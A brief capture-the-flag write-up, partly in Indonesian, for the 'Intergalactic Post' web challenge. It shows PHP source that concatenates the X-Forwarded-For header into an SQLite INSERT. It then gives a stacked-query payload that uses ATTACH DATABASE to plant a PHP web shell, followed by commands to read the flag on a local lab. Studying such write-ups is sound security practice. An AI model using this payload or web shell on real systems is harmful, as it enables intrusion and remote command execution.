# Intergalactic Post
#easy #web #sqlinjection #php #sqlite


Index.php
```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});


$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST', '/subscribe', 'SubsController@store');

die($router->match());
```

Database.php
```php
<?php
class Database
{
    private static $database = null;

    public function __construct($file)
    {
        if (!file_exists($file))
        {
            file_put_contents($file, '');
        }
        $this->db = new SQLite3($file);
        $this->migrate();

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function migrate()
    {
        $this->db->query('
            CREATE TABLE IF NOT EXISTS `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
            );
        ');
    }

    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
}
```

SubscriberModel.php
```php
<?php
class SubscriberModel extends Model
{

    public function __construct()
    {
        parent::__construct();
    }

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}
```

SubsController.php
```php
public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }
```


## Exploitasi
Sumber: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

Payload yang digunakan
```sqlite
X-Forwarded-For: 1.2.3.4', 'cool@gmail.com'); ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

Dapatkan flag
```
http://localhost:1337/lol.php?cmd=ls

http://localhost:1337/lol.php?cmd=ls ..

http://localhost:1337/lol.php?cmd=cat ../flag.txt
```